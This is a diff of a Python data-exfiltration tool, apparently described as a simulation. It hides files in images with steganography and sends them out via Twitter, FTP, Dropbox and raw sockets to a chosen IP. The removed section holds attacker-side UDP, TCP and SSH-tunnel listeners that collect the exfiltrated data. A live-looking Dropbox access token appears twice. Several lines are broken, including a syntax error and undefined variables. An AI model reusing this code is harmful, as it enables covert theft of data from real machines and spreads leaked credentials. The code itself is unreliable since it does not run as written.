@@ -291,11 +291,12 @@ def checkLine(filePath):
     return last
 from stegano import lsb
 def downloadImage():
+    global ,gpath
     User = dropbox.client.DropboxClient("7SeVe0XoVRAAAAAAAAAAB8G1v4FBYZoqZJWlHboxeu1U4PWTigmgn9pKUZDMjT-J")
     MDFolder = User.metadata('/')
     print( 'MD: ', MDFolder)
     f, MD = User.get_file_and_metadata("/diamond_PNG6695.png")
-    out = open('C:\\Users\Dhvanil\Desktop\diamond_PNG6695.png', 'wb')
+    out = open(gpath+'\diamond_PNG6695.png', 'wb')
     out.write(f.read())
     out.close()
 def stego():
@@ -330,13 +331,14 @@ def stego():
 
 '''
 # -*- utf-8 -*-
+testing purposes, this code isn't needed or part of this
 import sys
 import string
 from urllib import request
 def encrypt():
-    with open("C:\\Users\\Dhvanil\\Desktop\\FreeVector-Colorful-Shapes-Background.bmp", 'rb') as imagefile:
+    with open(gpath+"\\imager.png", 'rb') as imagefile:
         bmp = imagefile.read()
-    with open("C:\\Users\\Dhvanil\\Desktop\\fakesecretfile.txt", 'rb') as textInfo:
+    with open(gpath+"\\fakesecretfile.txt", 'rb') as textInfo:
         data = textInfo.read()
     PointofSteroids = bmp[10]  # The byte at position 10 tells us where the color data starts
     bmpa = bytearray(bmp)
@@ -480,6 +482,17 @@ def TwitterExfil():
             filename=gpath+"\\X"+str(fnum)+"combinedExfil.png"
             api.update_with_media(filename, status=fnum)
             fnum+=1
+def httpTransfer(): #Really Old-Needs replacing
+    file = open("fakesecretfile.txt", "rb")
+    pcs = os.path.getsize("fakesecretfile.txt")
+    sock = socket.socket()
+    ofs=0
+    sock.connect((ip, 4532))
+    while True:
+        chunk = file.read(8)
+        if not chunk:
+            break  # EOF
+        sock.sendall(filepart)
 def FTPTransfer():
     #This also assumes it will go out in txt file format, will be changed in the future
     global numBytes, numExfilFiles, numFiles, dT, eD,gpath
@@ -762,128 +775,6 @@ def contentSearch(): #Content search needs slight fixing, it will be fixed
         kc+=1
 #More Exfil methods to be added
 #Serverside code below
-#-----------------------------------------------------------------------------------------------------------------------
-#-----------------------------------------------------------------------------------------------------------------------
-#-----------------------------------------------------------------------------------------------------------------------
-#-----------------------------------------------------------------------------------------------------------------------
-def attackerUDP():
-    host = "127.0.0.1"
-    port = 6321
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.bind((host,port))
-    print("listening")
-    #s.listen(2)#waiting for two connections at a time
-    new_file = open(os.getcwd()+"\\exfiltrated_data.txt",'w')
-    print(os.getcwd()+"\\exfiltrated_data.txt")
-    #c, addr = s.accept() #C=Connection socket and address
-    #print("Connection formed with "+str(addr))
-    data = s.recvfrom(1024)[0].decode('utf-8')
-    print(data)
-    if not data:
-        print("No Data")
-        s.close()
-    else:
-        lineNum = 0
-        while data != "DONE":
-            data = s.recvfrom(1024)[0].decode('utf-8')
-            lineNum += 1
-            print('LINE '+str(lineNum)+': ' + data, end = ' -->') #Printing Info
-            print('writing data to file...')
-            new_file.write(data+'\n')
-            print('complete!')
-        new_file.close()
-        print('data exfiltrated and file closed')
-        s.close()
-def attackerTCP():
-    host = "127.0.0.1"
-    port = 63321
-    #TCP Conn
-    s = socket.socket()
-    s.bind((host,port))
-    print("listening")
-    s.listen(70)#waiting for two connections at a time
-    new_file = open(os.getcwd()+"\\exfiltrated_data.txt",'w')
-    print('new file created:'+(os.getcwd()+"\\exfiltrated_data.txt") )
-    c, addr = s.accept() #C=Connection socket and address
-    print("Connection formed with "+str(addr))
-    data = c.recv(1024).decode('utf-8')
-    if not data:
-        print("No Data")
-        s.close()
-    else:
-        lineNum = 0
-        data = data.split('\n')
-        for each in data:
-            lineNum += 1
-            print(str(addr)+'\nLINE '+str(lineNum)+': ' + each, end = ' -->') #Printing Info
-            print('writing data to file...')
-            new_file.write(each+'\n')
-            print('complete!')
-        new_file.close()
-        print('data exfiltrated and file closed')
-def grabFile():
-    session = ftplib.FTP('demo.wftpserver.com','demo-user', 'demo-user')
-    session.login('demo-user', 'demo-user') 
-    #login("ftpuser","pwd")
-    session.retrlines('LIST')     # list directory contents 
-    session.cwd('upload')
-    filename = '1combinedExfil.txt'
-    localfile = open("stealing.txt", 'wb')
-    session.retrbinary('RETR ' + filename, localfile.write, 1024)
-    session.quit()
-    localfile.close()
-def FileRetr():
-    User = dropbox.client.DropboxClient("7SeVe0XoVRAAAAAAAAAAB8G1v4FBYZoqZJWlHboxeu1U4PWTigmgn9pKUZDMjT-J")
-    MDFolder = User.metadata('/')
-    print( 'MD: ', MDFolder)
-    f, MD = User.get_file_and_metadata('/1combinedExfil.txt')
-    out = open('Sto.txt', 'wb')
-    out.write(f.read())
-    out.close()
-def decrypt(key,path):
-    with open('data.txt', 'r') as myfile:
-        fileIn=myfile.read().replace('\n', '')
-        for c in enumerate(fileIn):
-            KY1 = ord(key[4 % len(key)])
-            Encr1 = ord(c)
-            line2=(chr((Encr1 - KY1) % 129))
-            fileFil2.write(line2)
-def http(): #needsfixing
-    file = open("fakesecretfile.txt", "rb")
-    pcs = os.path.getsize("fakesecretfile.txt")
-    sock = socket.socket()
-    ofs=0
-    ip=input("What is the ip this file will be sent to for this exfiltration simulation?")
-    sock.connect((ip, 4532))
-    while True:
-        chunk = file.read(8)
-        if not chunk:
-            break  # EOF
-        sock.sendall(filepart)
-def SSHTunnelRecieve(gpath,s,fname,numFiles):
-    tcpSocketObj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    tcpSocketObj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
-    tcpSocketObj.bind(('127.0.0.1', 22))
-    tcpSocketObj.listen(100)
-    print ('Waiting For Connection')
-    client, addr = tcpSocketObj.accept()
-    print ('Connection made with '+str(client)+" with the ip"+ str(addr))
-    cliD = paramiko.Transport(client)
-    cliD.load_server_moduli()
-    cliD.add_server_key(Thekey)
-    server = Interface()
-    cliD.start_server(server=server)
-    tunnel = cliD.accept(20)
-    print ('Authenticated! Data exfil started')
-    newFile = open((os.getcwd()+"\\exfiltrated_data.txt"),'w')
-    tempText=""
-    while tempText!="Quit":
-        tempText=(tunnel.recv(1024).decode("utf-8"))
-        newFile.write(tempText)
-        print(tempText)
-        if tempText=="Quit":
-            print("Exfiltrated Data Recieved")
-    tunnel.send('Success')
 #--------------------------------------------------------------------------------------------------------------------------------------------
 #------SERVER SIDE(Under Work)------------SERVER SIDE(Under Work)------------SERVER SIDE(Under Work)------------SERVER SIDE(Under Work)------
 #------SERVER SIDE(Under Work)------------SERVER SIDE(Under Work)------------SERVER SIDE(Under Work)------------SERVER SIDE(Under Work)------
